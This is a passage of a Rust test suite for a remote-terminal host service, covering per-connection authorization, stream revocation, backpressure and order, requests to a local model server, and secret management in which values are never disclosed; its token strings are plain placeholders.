    /// Another connection listed it, and this one did not.
    ListedInAnotherConnectionOnly,
    /// Listed, and nothing has changed.
    Listed,
}

const ALL_CASES: [Case; 6] = [
    Case::EntryClosedAndNewCreatedBetween,
    Case::NeverListed,
    Case::ListedThenRemoved,
    Case::ListedThenReused,
    Case::ListedInAnotherConnectionOnly,
    Case::Listed,
];

/// Whether `op` from a connection in `case` is expected to reach the registry.
/// Only a connection that was sent the terminal may act on it. In the window
/// case, an add still goes through: its project is the same folder, and the
/// entry it did not name is not what an add acts on.
fn expected(op: Op, case: Case) -> bool {
    match case {
        Case::Listed => true,
        Case::EntryClosedAndNewCreatedBetween => op == Op::Add,
        _ => false,
    }
}

/// Attaches a stream to terminal 7 as a terminal window does. Some stream when
/// the host attached it.
fn raw_attach(conn: &dyn Connection) -> Option<Box<dyn Stream>> {
    let stream = conn.open_stream().ok()?;
    stream
        .send(&Message::Attach {
            terminal: 7,
            resume_seq: 0,
            cols: 60,
            rows: 12,
        })
        .ok()?;
    match stream.recv(Duration::from_secs(5)).ok()? {
        Some(Message::Attached { .. }) => Some(stream),
        _ => None,
    }
}

/// Asks for a size. True when the host applied it, false when it refused.
fn resize_allowed(stream: &dyn Stream) -> bool {
    // A revoked stream may already have ended: a closed send or receive is a
    // refusal too.
    if stream
        .send(&Message::Resize { cols: 70, rows: 20 })
        .is_err()
    {
        return false;
    }
    loop {
        match stream.recv(Duration::from_secs(5)) {
            Ok(Some(Message::Size { .. })) => return true,
            Ok(Some(Message::Denied(_)) | None) | Err(_) => return false,
            // A repaint or status that arrived first.
            Ok(Some(_)) => {}
        }
    }
}

/// Sends input, then a resize whose answer comes after the input was handled.
/// True when the host did not refuse the input.
fn input_allowed(stream: &dyn Stream) -> bool {
    if stream.send(&Message::Input(b"x".to_vec())).is_err() {
        return false;
    }
    resize_allowed(stream)
}

/// Whether `op` from a connection in `case` reaches the host's registry.
fn allowed(op: Op, case: Case) -> bool {
    let rig = Rig::with_list(vec![terminal(7, "p", None)], FakeSession::new(1 << 20));
    let (acting, conn) = match case {
        Case::NeverListed => rig.connect_as(false),
        Case::ListedInAnotherConnectionOnly => {
            let (other, _) = rig.connect_as(true);
            other.close();
            rig.connect_as(false)
        }
        _ => rig.connect_as(true),
    };
    // Input and resize need a stream attached before the change, so the change
    // is what a live stream meets.
    let stream = if matches!(op, Op::Input | Op::Resize) {
        match raw_attach(&*conn) {
            Some(stream) => Some(stream),
            None => return false,
        }
    } else {
        None
    };
    let manages = matches!(op, Op::Rename | Op::Restart | Op::Close | Op::Add);
    if case == Case::EntryClosedAndNewCreatedBetween && manages {
        // Entry 7 closes and a new entry (8) starts in the same project.
        let managed = Arc::clone(&rig.managed);
        *rig.managed.between.lock().unwrap() = Some(Box::new(move || {
            *managed.inner.0.lock().unwrap() = vec![terminal(8, "p", None)];
        }));
    }
    match case {
        Case::ListedThenRemoved => {
            rig.managed.inner.0.lock().unwrap().clear();
            acting.listing().unwrap();
        }
        Case::ListedThenReused => {
            // A new entry, under number 7, in a different project.
            *rig.managed.inner.0.lock().unwrap() = vec![terminal(7, "q", None)];
        }
        _ => {}
    }
    let result = match op {
        Op::Attach => raw_attach(&*conn).is_some(),
        Op::Input => input_allowed(&*stream.unwrap()),
        Op::Resize => resize_allowed(&*stream.unwrap()),
        Op::Rename => acting
            .manage(ManageOp::Rename {
                terminal: 7,
                name: Some("renamed".into()),
            })
            .is_ok(),
        Op::Restart => acting.manage(ManageOp::Restart { terminal: 7 }).is_ok(),
        Op::Close => acting.manage(ManageOp::Close { terminal: 7 }).is_ok(),
        Op::Add => acting
            .manage(ManageOp::Add {
                tool: 1,
                name: None,
                project: Some("p".into()),
                model: None,
            })
            .is_ok(),
    };
    if case == Case::EntryClosedAndNewCreatedBetween && manages {
        assert!(
            rig.managed.between.lock().unwrap().is_none(),
            "the window between the check and the action was not reached"
        );
    }
    result
}

#[test]
fn every_operation_is_allowed_only_on_what_the_connections_latest_list_sent() {
    // The rule: an operation from a connection is allowed only on a terminal or
    // project that the latest list sent to THAT connection contained, identified
    // by its stable identity, checked at dispatch time.
    for case in ALL_CASES {
        for op in ALL_OPS {
            // The window is the registry's action, which only management and add
            // have.
            if case == Case::EntryClosedAndNewCreatedBetween
                && matches!(op, Op::Attach | Op::Input | Op::Resize)
            {
                continue;
            }
            assert_eq!(allowed(op, case), expected(op, case), "{op:?} in {case:?}");
        }
    }
}

#[test]
fn a_revoking_listing_stops_input_before_the_next_input_is_applied() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal(7, "p", None)], Arc::clone(&session));
    let (client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    // The host drops the terminal, and the peer receives that list.
    rig.managed.inner.0.lock().unwrap().clear();
    client.listing().unwrap();
    assert!(!input_allowed(&*stream));
    assert!(session.typed().is_empty(), "input reached the session");
}

#[test]
fn a_revoked_stream_gets_no_more_output_and_is_told_why() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    // The host drops the terminal from the list, and the peer receives that list.
    rig.managed.inner.0.lock().unwrap().clear();
    client.listing().unwrap();
    session.print(b"secret after the revocation\r\n");
    let mut leaked = false;
    let mut told = false;
    while let Some(message) = stream.recv(Duration::from_secs(5)).unwrap() {
        match message {
            Message::Output { bytes, .. } => {
                leaked |= bytes.windows(6).any(|w| w == b"secret");
            }
            Message::Denied(DenyReason::NoSuchTerminal) => {
                told = true;
                break;
            }
            _ => {}
        }
    }
    assert!(told, "the revoked stream was not told");
    assert!(!leaked, "output reached a revoked stream");
}

/// A guard that runs `on_attach` when a terminal is attached, before it decides.
struct HookGuard {
    inner: Arc<RemoteGate>,
    on_attach: Mutex<Option<Box<dyn FnOnce() + Send>>>,
    /// While set, input waits: the host stops reading what the peer sends.
    hold_input: Option<Arc<AtomicBool>>,
    /// How many of the peer's streams the host has finished with.
    detaches: Arc<AtomicUsize>,
    /// Runs once a management action was allowed, before the guard returns.
    after_manage: Mutex<Option<Box<dyn FnOnce() + Send>>>,
}

impl RemoteGuard for HookGuard {
    fn enabled(&self) -> bool {
        self.inner.enabled()
    }
    fn paused(&self) -> bool {
        self.inner.paused()
    }
    fn set_enabled(&self, on: bool) {
        self.inner.set_enabled(on);
    }
    fn connected(&self, peer: &RemotePeer, outcome: Result<(), &str>) {
        self.inner.connected(peer, outcome);
    }
    fn attach(&self, peer: &RemotePeer, terminal: &str, attempt: u64) -> Result<(), GuardDenied> {
        if let Some(hook) = self.on_attach.lock().unwrap().take() {
            hook();
        }
        self.inner.attach(peer, terminal, attempt)
    }
    fn input(
        &self,
        peer: &RemotePeer,
        terminal: &str,
        attempt: u64,
        bytes: &[u8],
    ) -> Result<(), GuardDenied> {
        if let Some(hold) = &self.hold_input {
            while hold.load(Ordering::SeqCst) {
                thread::sleep(Duration::from_millis(1));
            }
        }
        self.inner.input(peer, terminal, attempt, bytes)
    }
    fn resize(&self, peer: &RemotePeer, terminal: &str, attempt: u64) -> Result<(), GuardDenied> {
        self.inner.resize(peer, terminal, attempt)
    }
    fn manage(
        &self,
        peer: &RemotePeer,
        action: &'static str,
        terminal: &str,
        attempt: u64,
    ) -> Result<(), GuardDenied> {
        let decided = self.inner.manage(peer, action, terminal, attempt);
        if decided.is_ok()
            && let Some(hook) = self.after_manage.lock().unwrap().take()
        {
            hook();
        }
        decided
    }
    fn detach(&self, peer: &RemotePeer, terminal: &str, attempt: u64) {
        self.detaches.fetch_add(1, Ordering::SeqCst);
        self.inner.detach(peer, terminal, attempt);
    }
}

/// A Pause, or hosting turned off, while the guard decides a project ask:
/// the ask never reaches the project, though the guard allowed it.
#[test]
fn a_pause_or_hosting_off_while_the_guard_decides_a_project_ask_changes_nothing() {
    use connecto_net::project_panels::ProjectAsk;
    for hosting_off in [false, true] {
        let mut rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
        let keys = Arc::new(
            AuthorizedKeySet::parse(&format!(
                "{}\n",
                rig.allowed.public_key().to_openssh().unwrap()
            ))
            .unwrap(),
        );
        let (pause, gate) = (Arc::clone(&rig.pause), Arc::clone(&rig.guard));
        let hook: Box<dyn FnOnce() + Send> = if hosting_off {
            Box::new(move || gate.set_enabled(false))
        } else {
            Box::new(move || pause.pause())
        };
        let guard = Arc::new(HookGuard {
            inner: Arc::clone(&rig.guard),
            on_attach: Mutex::new(None),
            hold_input: None,
            detaches: Arc::new(AtomicUsize::new(0)),
            after_manage: Mutex::new(Some(hook)),
        });
        rig.host = Arc::new(HostService::new(
            Arc::clone(&rig.managed) as Arc<dyn HostTerminals>,
            Arc::new(move || Arc::clone(&keys)),
            guard as Arc<dyn RemoteGuard>,
        ));
        let client = rig.client(&rig.signer()).unwrap();
        let err = client
            .project_ask("p", &ProjectAsk::TokensUndo)
            .unwrap_err();
        let want = if hosting_off {
            DenyReason::Disabled
        } else {
            DenyReason::Paused
        };
        assert!(
            matches!(&err, ClientError::Denied(reason) if *reason == want),
            "{err}"
        );
        assert!(
            rig.managed.asks.lock().unwrap().is_empty(),
            "nothing reached the project"
        );
    }
}

/// A rig whose guard runs `on_attach` at the next attach.
fn hooked_rig(
    list: Vec<HostTerminal>,
    session: Arc<FakeSession>,
    on_attach: Box<dyn FnOnce() + Send>,
) -> Rig {
    let mut rig = Rig::with_list(list, session);
    let keys = Arc::new(
        AuthorizedKeySet::parse(&format!(
            "{}\n",
            rig.allowed.public_key().to_openssh().unwrap()
        ))
        .unwrap(),
    );
    let guard = Arc::new(HookGuard {
        inner: Arc::clone(&rig.guard),
        on_attach: Mutex::new(Some(on_attach)),
        hold_input: None,
        detaches: Arc::new(AtomicUsize::new(0)),
        after_manage: Mutex::new(None),
    });
    rig.host = Arc::new(HostService::new(
        Arc::clone(&rig.managed) as Arc<dyn HostTerminals>,
        Arc::new(move || Arc::clone(&keys)),
        guard as Arc<dyn RemoteGuard>,
    ));
    rig
}

#[test]
fn a_revocation_while_the_attach_guard_runs_sends_no_repaint_and_no_output() {
    let session = FakeSession::new(1 << 20);
    let (started_tx, started_rx) = std::sync::mpsc::channel::<()>();
    let (release_tx, release_rx) = std::sync::mpsc::channel::<()>();
    let hook = Box::new(move || {
        started_tx.send(()).unwrap();
        release_rx.recv().unwrap();
    });
    let rig = hooked_rig(
        vec![terminal_on(&session, 7, "p")],
        Arc::clone(&session),
        hook,
    );
    let (client, conn) = rig.connect_as(true);
    session.print(b"before the attach\r\n");
    let stream = conn.open_stream().unwrap();
    stream
        .send(&Message::Attach {
            terminal: 7,
            resume_seq: 0,
            cols: 60,
            rows: 12,
        })
        .unwrap();
    // The guard is running: the host has not sent anything for the attach yet.
    started_rx.recv_timeout(Duration::from_secs(5)).unwrap();
    rig.managed.inner.0.lock().unwrap().clear();
    client.listing().unwrap();
    session.print(b"secret after the revocation\r\n");
    release_tx.send(()).unwrap();

    let mut attached = false;
    let mut leaked = false;
    let mut told = false;
    while let Some(message) = stream.recv(Duration::from_secs(5)).unwrap() {
        match message {
            Message::Attached { .. } | Message::Resync { .. } => attached = true,
            Message::Output { bytes, .. } => {
                leaked |= bytes.windows(6).any(|w| w == b"secret");
            }
            Message::Denied(DenyReason::NoSuchTerminal) => {
                told = true;
                break;
            }
            _ => {}
        }
    }
    assert!(told, "the revoked attach was not refused");
    assert!(!attached, "a repaint was sent for a revoked terminal");
    assert!(!leaked, "output reached a revoked terminal");
}

#[test]
fn an_idle_stream_whose_terminal_is_revoked_ends_and_releases_its_size_lease() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    // A peer's resize takes the size lease.
    stream
        .send(&Message::Resize { cols: 70, rows: 20 })
        .unwrap();
    wait_until("the size lease is taken", || {
        session.control.lock().unwrap().0
    });
    // Nothing is printed. The host drops the terminal and the peer lists.
    rig.managed.inner.0.lock().unwrap().clear();
    client.listing().unwrap();
    let mut told = false;
    while let Some(message) = stream.recv(Duration::from_secs(5)).unwrap() {
        if matches!(message, Message::Denied(DenyReason::NoSuchTerminal)) {
            told = true;
            break;
        }
    }
    assert!(told, "an idle revoked stream was not ended");
    wait_until("the size lease is released", || {
        !session.control.lock().unwrap().0
    });
}

#[test]
fn a_peer_cannot_close_a_parent_whose_child_it_was_not_sent() {
    // The child (70) is past the 64 offered, so the peer was never sent it.
    let mut list: Vec<HostTerminal> = (1..=64).map(|id| terminal(id, "p", None)).collect();
    list.push(terminal(70, "p", Some(1)));
    let rig = Rig::with_list(list, FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let err = client.manage(ManageOp::Close { terminal: 1 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == HIDDEN_CHILD_REFUSAL),
        "{err}"
    );
    assert!(
        rig.managed.ops.lock().unwrap().is_empty(),
        "something was closed"
    );
    assert_eq!(rig.managed.inner.list().len(), 65, "a terminal went away");
}

#[test]
fn a_peer_closes_a_parent_and_all_its_descendants_when_it_was_sent_them_all() {
    let rig = Rig::with_list(
        vec![
            terminal(1, "p", None),
            terminal(2, "p", Some(1)),
            terminal(3, "p", Some(2)),
        ],
        FakeSession::new(1 << 20),
    );
    let client = rig.client(&rig.signer()).unwrap();
    client.manage(ManageOp::Close { terminal: 1 }).unwrap();
    assert_eq!(
        *rig.managed.ops.lock().unwrap(),
        [ManageOp::Close { terminal: 1 }]
    );
}

#[test]
fn a_stream_that_never_reads_fails_and_the_listing_still_works() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    // The peer sends a message a terminal stream does not take, so the host
    // answers each with a refusal, and never reads the answers. Those are not
    // audited, so nothing on the host waits on them: the reply queue fills.
    for _ in 0..600 {
        let _ = stream.send(&Message::ListTerminals);
    }
    // Other traffic still goes through: the listing, and a management request.
    let started = Instant::now();
    client.listing().unwrap();
    assert!(
        started.elapsed() < Duration::from_secs(5),
        "the listing waited"
    );
    client.manage(ManageOp::Restart { terminal: 7 }).unwrap();
    // The stream that did not read is over: once its queue is full the host
    // ends it, so the peer's reads end after the queued answers.
    let mut ended = false;
    for _ in 0..800 {
        if stream.recv(Duration::from_millis(20)).is_err() {
            ended = true;
            break;
        }
    }
    assert!(ended, "a stream that never read was not ended");
}

#[test]
fn a_child_added_while_the_close_waits_is_refused_and_nothing_is_closed() {
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    // The child appears in the registry after the peer was sent its list, and
    // before the close runs.
    let managed = Arc::clone(&rig.managed);
    *rig.managed.between.lock().unwrap() = Some(Box::new(move || {
        managed
            .inner
            .0
            .lock()
            .unwrap()
            .push(terminal(2, "p", Some(1)));
    }));
    let err = client.manage(ManageOp::Close { terminal: 1 }).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == HIDDEN_CHILD_REFUSAL),
        "{err}"
    );
    assert!(
        rig.managed.ops.lock().unwrap().is_empty(),
        "something was closed"
    );
    assert_eq!(rig.managed.inner.list().len(), 2, "a terminal went away");
}

/// The bytes a peer reads from its output, in order, until `want` are read or
/// the stream ends.
fn read_output(stream: &dyn Stream, want: usize) -> Vec<u8> {
    let mut got = Vec::new();
    while got.len() < want {
        match stream.recv(Duration::from_secs(5)) {
            Ok(Some(Message::Output { bytes, .. })) => got.extend(bytes),
            Ok(Some(Message::Denied(why))) => panic!("refused: {why:?}"),
            Ok(Some(_)) => {}
            Ok(None) | Err(_) => break,
        }
    }
    got
}

#[test]
fn a_slow_reader_receives_every_byte_in_order() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (_client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    // The peer does not read while the terminal prints a lot in small pieces:
    // the peer's queue fills, and the host waits for it rather than cutting it off.
    let mut expected = Vec::new();
    for n in 0..400 {
        let piece = format!("piece {n:04}\r\n");
        session.print(piece.as_bytes());
        expected.extend(piece.bytes());
        thread::sleep(Duration::from_millis(1));
    }
    thread::sleep(Duration::from_millis(200));
    let got = read_output(&*stream, expected.len());
    assert_eq!(got.len(), expected.len(), "bytes were lost");
    assert!(got == expected, "bytes arrived out of order");
}

#[test]
fn a_revoke_while_output_waits_for_a_slow_peer_stops_it() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (client, conn) = rig.connect_as(true);
    let stream = raw_attach(&*conn).unwrap();
    for n in 0..300 {
        session.print(format!("before {n:04}\r\n").as_bytes());
        thread::sleep(Duration::from_millis(1));
    }
    // The terminal is dropped while the output is waiting for the peer.
    rig.managed.inner.0.lock().unwrap().clear();
    client.listing().unwrap();
    session.print(b"SECRET after the revoke\r\n");
    let mut got = Vec::new();
    loop {
        match stream.recv(Duration::from_secs(5)) {
            Ok(Some(Message::Output { bytes, .. })) => got.extend(bytes),
            Ok(Some(_)) => {}
            Ok(None) | Err(_) => break,
        }
    }
    assert!(
        !got.windows(6).any(|w| w == b"SECRET"),
        "output reached a revoked stream"
    );
}

/// A rig whose host does not read input while `hold` is set.
fn holding_rig(session: &Arc<FakeSession>, hold: Arc<AtomicBool>) -> Rig {
    let mut rig = Rig::with_list(vec![terminal_on(session, 7, "p")], Arc::clone(session));
    let keys = Arc::new(
        AuthorizedKeySet::parse(&format!(
            "{}\n",
            rig.allowed.public_key().to_openssh().unwrap()
        ))
        .unwrap(),
    );
    let guard = Arc::new(HookGuard {
        inner: Arc::clone(&rig.guard),
        on_attach: Mutex::new(None),
        hold_input: Some(hold),
        detaches: Arc::new(AtomicUsize::new(0)),
        after_manage: Mutex::new(None),
    });
    rig.host = Arc::new(HostService::new(
        Arc::clone(&rig.managed) as Arc<dyn HostTerminals>,
        Arc::new(move || Arc::clone(&keys)),
        guard as Arc<dyn RemoteGuard>,
    ));
    rig
}

#[test]
fn a_large_paste_during_a_host_pause_arrives_complete_and_in_order() {
    let session = FakeSession::new(1 << 20);
    let hold = Arc::new(AtomicBool::new(true));
    let rig = holding_rig(&session, Arc::clone(&hold));
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    // The host is paused. The paste goes out in pieces while it is: the host's
    // queue for this peer fills, and the peer waits instead of failing.
    let mut pasted: Vec<u8> = Vec::new();
    for n in 0..400 {
        let piece = format!("<{n:04}>{}", "x".repeat(1000)).into_bytes();
        pasted.extend(&piece);
        remote.send_input(piece).unwrap();
        thread::sleep(Duration::from_millis(1));
    }
    thread::sleep(Duration::from_millis(100));
    hold.store(false, Ordering::SeqCst);
    wait_until("the paste to reach the host", || {
        session.typed().len() >= pasted.len()
    });
    assert_eq!(session.typed().len(), pasted.len(), "bytes were lost");
    assert!(session.typed() == pasted, "bytes arrived out of order");
    assert!(remote.is_linked(), "a pause closed the link");
}

#[test]
fn a_restart_while_output_waits_retires_the_old_stream_and_the_new_attachment_proceeds() {
    let session = FakeSession::new(1 << 20);
    let rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let (_client, conn) = rig.connect_as(true);
    // The old stream never reads, so its output waits for room.
    let old = raw_attach(&*conn).unwrap();
    for n in 0..300 {
        session.print(format!("old {n:04}\r\n").as_bytes());
        thread::sleep(Duration::from_millis(1));
    }
    // The terminal is restarted: the old ring is closed, and a new session
    // takes the same entry (the grant does not change).
    session.ring.close();
    let fresh = FakeSession::new(1 << 20);
    rig.managed.inner.0.lock().unwrap().clear();
    rig.managed
        .inner
        .0
        .lock()
        .unwrap()
        .push(terminal_on(&fresh, 7, "p"));
    fresh.print(b"fresh after the restart\r\n");
    // The new attachment is accepted and gets the new terminal's output.
    let replacement = raw_attach(&*conn).expect("the replacement was refused");
    let mut got = Vec::new();
    while let Ok(Some(message)) = replacement.recv(Duration::from_secs(5)) {
        match message {
            // The new terminal's screen, or output after it.
            Message::Resync { repaint, .. } => got.extend(repaint),
            Message::Output { bytes, .. } => got.extend(bytes),
            _ => {}
        }
        if got.windows(5).any(|w| w == b"fresh") {
            break;
        }
    }
    assert!(
        got.windows(5).any(|w| w == b"fresh"),
        "no output from the new terminal"
    );
    // The retired stream ends: its queued messages run out, then the stream is over.
    let mut ended = false;
    for _ in 0..500 {
        if old.recv(Duration::from_millis(20)).is_err() {
            ended = true;
            break;
        }
    }
    assert!(ended, "the retired stream never ended");
}

#[test]
fn a_reattachment_ends_the_old_stream_even_while_it_stays_silent() {
    let session = FakeSession::new(1 << 20);
    let mut rig = Rig::with_list(vec![terminal_on(&session, 7, "p")], Arc::clone(&session));
    let keys = Arc::new(
        AuthorizedKeySet::parse(&format!(
            "{}\n",
            rig.allowed.public_key().to_openssh().unwrap()
        ))
        .unwrap(),
    );
    let detaches = Arc::new(AtomicUsize::new(0));
    let guard = Arc::new(HookGuard {
        inner: Arc::clone(&rig.guard),
        on_attach: Mutex::new(None),
        hold_input: None,
        detaches: Arc::clone(&detaches),
        after_manage: Mutex::new(None),
    });
    rig.host = Arc::new(HostService::new(
        Arc::clone(&rig.managed) as Arc<dyn HostTerminals>,
        Arc::new(move || Arc::clone(&keys)),
        guard as Arc<dyn RemoteGuard>,
    ));
    let client = rig.client(&rig.signer()).unwrap();
    let remote = attach(&client);
    // The old stream stays silent (nothing prints). The peer attaches again.
    remote.attach(&client, 7).unwrap();
    // The old stream's reader and writer end, so its stream is dropped, and the
    // host finishes with it. The new stream is still there.
    wait_until("the old stream to be finished by the host", || {
        detaches.load(Ordering::SeqCst) >= 1
    });
    assert_eq!(
        detaches.load(Ordering::SeqCst),
        1,
        "the new stream was finished too"
    );
    assert!(remote.is_linked(), "the new attachment is not up");
}

/// A peer's chat completion goes to the conversation model set on the host,
/// a server on the host's own machine the peer never reaches: its answer
/// comes back without reasoning. With none set the peer is told so; a pause
/// refuses it, and every request asks the guard.
#[test]
fn a_peer_asks_the_hosts_conversation_model() {
    use connecto_net::wire::{Completion, Role};
    use std::io::{Read, Write};

    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let request = Completion {
        messages: vec![
            (Role::System, "Rispondi in breve.".into()),
            (Role::User, "Ciao".into()),
        ],
        max_tokens: 60,
        temperature: 30,
        wait_ms: 5000,
    };
    let err = client.complete(&request).unwrap_err();
    assert!(
        matches!(&err, ClientError::Remote(why) if why == connecto_net::assistant::NOT_SET_UP),
        "{err}"
    );

    // LM Studio, faked: one answer on this machine.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!(
        "http://{}/v1/chat/completions",
        listener.local_addr().unwrap()
    );
    let server = thread::spawn(move || {
        let (mut conn, _) = listener.accept().unwrap();
        let mut got = Vec::new();
        let mut buf = [0u8; 4096];
        while !String::from_utf8_lossy(&got).contains("\"Ciao\"") {
            let n = conn.read(&mut buf).unwrap();
            got.extend_from_slice(&buf[..n]);
        }
        let body = r#"{"choices":[{"message":{"content":"<think></think>Ciao! Cosa facciamo?"}}]}"#;
        write!(
            conn,
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{body}",
            body.len()
        )
        .unwrap();
        String::from_utf8(got).unwrap()
    });
    *rig.managed.assistant.lock().unwrap() = Some(connecto_net::assistant::AssistantConfig {
        url,
        model: "qwen".into(),
    });
    assert_eq!(client.complete(&request).unwrap(), "Ciao! Cosa facciamo?");
    assert!(server.join().unwrap().contains("Rispondi in breve."));

    rig.pause.pause();
    let err = client.complete(&request).unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    rig.pause.resume();
    assert!(rig.audit().contains("assistant"), "{}", rig.audit());
}

/// A phone asks the host whether what was said so far in a voice call is a
/// finished turn: without Jev the host says it cannot judge; with it, the
/// answer comes back in percent, within the host's limit. A pause refuses
/// it, and every request asks the guard.
#[test]
fn a_peer_asks_the_host_whether_a_turn_is_over() {
    use connecto_net::wire::{NO_TURN_JUDGE, TurnScores, TurnVerdict};

    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let client = rig.client(&rig.signer()).unwrap();
    let wait = Duration::from_secs(5);
    assert_eq!(
        client.turn_check("vorrei che tu", "", wait).unwrap(),
        TurnVerdict::Unavailable(NO_TURN_JUDGE.into())
    );
    *rig.managed.turn.lock().unwrap() = Some(TurnScores {
        complete: 0.071,
        fits: None,
    });
    assert_eq!(
        client.turn_check("vorrei che tu", "", wait).unwrap(),
        TurnVerdict::Judged {
            complete: 7,
            fits: None
        }
    );
    // With the call's context, whether it fits comes back too.
    *rig.managed.turn.lock().unwrap() = Some(TurnScores {
        complete: 0.9,
        fits: Some(0.034),
    });
    assert_eq!(
        client
            .turn_check("amore hai visto le chiavi", "Progetto: connecto", wait)
            .unwrap(),
        TurnVerdict::Judged {
            complete: 90,
            fits: Some(3)
        }
    );
    let asked = rig.managed.turns_asked.lock().unwrap().clone();
    assert_eq!(asked[1].0, "vorrei che tu");
    assert_eq!(asked[2].1, "Progetto: connecto");
    // The host never gives Jev longer than its own limit.
    assert!(asked[1].2 <= connecto_net::host::MAX_TURN_WAIT, "{asked:?}");
    // A transcript too long for the frame is not asked about: cutting it
    // before the host redacts it could split a secret. Even one byte over,
    // with the key's value right at the cut, goes nowhere.
    let asked_before = rig.managed.turns_asked.lock().unwrap().len();
    let long = format!(
        "{}api_key={}",
        "a".repeat(connecto_net::wire::MAX_TURN_TEXT - 30),
        "sk-live-abcdef0123456789"
    );
    assert!(long.len() > connecto_net::wire::MAX_TURN_TEXT);
    assert!(matches!(
        client.turn_check(&long, "", wait).unwrap(),
        TurnVerdict::Failed(_)
    ));
    assert_eq!(rig.managed.turns_asked.lock().unwrap().len(), asked_before);
    let context = format!(
        "{}api_key={}",
        "a".repeat(connecto_net::wire::MAX_TURN_CONTEXT - 30),
        "sk-live-abcdef0123456789"
    );
    assert!(matches!(
        client.turn_check("ciao", &context, wait).unwrap(),
        TurnVerdict::Failed(_)
    ));
    assert_eq!(rig.managed.turns_asked.lock().unwrap().len(), asked_before);

    rig.pause.pause();
    let err = client.turn_check("ciao", "", wait).unwrap_err();
    assert!(
        matches!(err, ClientError::Denied(DenyReason::Paused)),
        "{err}"
    );
    rig.pause.resume();
    assert!(rig.audit().contains("assistant"), "{}", rig.audit());
}

// ---------- a project's secrets, from a peer

const SECRET: &str = "ghp_remote_value_0123456789";
const SECRET_2: &str = "ghp_second_value_9876543210";

fn secrets(client: &RemoteClient) -> (Vec<u8>, connecto_net::remote_secrets::SecretsAnswer) {
    use connecto_net::project_panels::ProjectAsk;
    let bytes = client
        .project_ask("p", &ProjectAsk::Secrets { after: None })
        .unwrap();
    let answer = connecto_net::remote_secrets::secrets_from(&bytes).unwrap();
    (bytes, answer)
}

fn act(
    client: &RemoteClient,
    action: connecto_net::remote_secrets::SecretsAction,
) -> Result<Vec<u8>, ClientError> {
    client.project_ask(
        "p",
        &connecto_net::project_panels::ProjectAsk::SecretsAct(action),
    )
}

fn holds(vault: &connecto_vault::Vault, value: &str) -> bool {
    connecto_core::VaultBridge::known(vault)
        .iter()
        .any(|k| k == value)
}

/// A peer adds, replaces, changes the use of, generates and removes a
/// secret of a project it was sent, and the host's person is told of each.
/// Each is that project's own: an app-wide secret of the same name is left
/// as it was. No answer, audit record or notice holds a value, and an SSH
/// key made for the peer comes back as its public half only.
#[test]
fn a_peer_adds_replaces_changes_and_removes_a_projects_secret_and_never_sees_a_value() {
    use connecto_core::{Binding, ProviderScope, VaultControl};
    use connecto_net::remote_secrets::{SecretValue, SecretsAction};
    let rig = Rig::with_list(vec![terminal(1, "p", None)], FakeSession::new(1 << 20));
    let vault = Arc::clone(&rig.managed.vault);
    vault
        .put(&ProviderScope::Global, "GH", "", "app-wide-value-000")
        .unwrap();
    let client = rig.client(&rig.signer()).unwrap();
    let mut answers: Vec<Vec<u8>> = Vec::new();
    let project = ProviderScope::Project("p".into());
    let entry = |name: &str| {
        vault
            .view()
            .entries
            .iter()
            .find(|e| e.scope == project && e.name == name)
            .cloned()
    };

    answers.push(
        act(
            &client,
            SecretsAction::Put {
                name: "GH".into(),
                description: "deploys".into(),
                value: SecretValue::new(SECRET.into()),
            },
        )
        .unwrap(),
    );
    assert_eq!(entry("GH").unwrap().description, "deploys");
    assert!(holds(&vault, SECRET));
    let (bytes, listed) = secrets(&client);
    answers.push(bytes);
    assert_eq!(
        listed.entries.len(),
        1,
        "the project's own, not the app-wide one"
    );
    assert_eq!(listed.entries[0].name, "GH");

    answers.push(
        act(
            &client,
            SecretsAction::Put {
                name: "GH".into(),
                description: "deploys".into(),
                value: SecretValue::new(SECRET_2.into()),
            },
        )
        .unwrap(),
    );
    assert!(
        holds(&vault, SECRET_2) && !holds(&vault, SECRET),
        "replaced"
    );

    let http = Binding::Http {
        base_url: "https://api.github.com".into(),
        header: "Authorization".into(),
        prefix: "Bearer ".into(),
    };
    answers.push(
        act(
            &client,
            SecretsAction::SetBindings {
                name: "GH".into(),
                bindings: vec![http.clone()],
            },
        )
        .unwrap(),
    );
    assert_eq!(entry("GH").unwrap().bindings, vec![http]);
    // A use the host refuses is refused to the peer in the host's words.
    let err = act(
        &client,
        SecretsAction::SetBindings {
            name: "GH".into(),
            bindings: vec![Binding::Http {
                base_url: "ftp://elsewhere".into(),
                header: "Authorization".into(),
                prefix: String::new(),
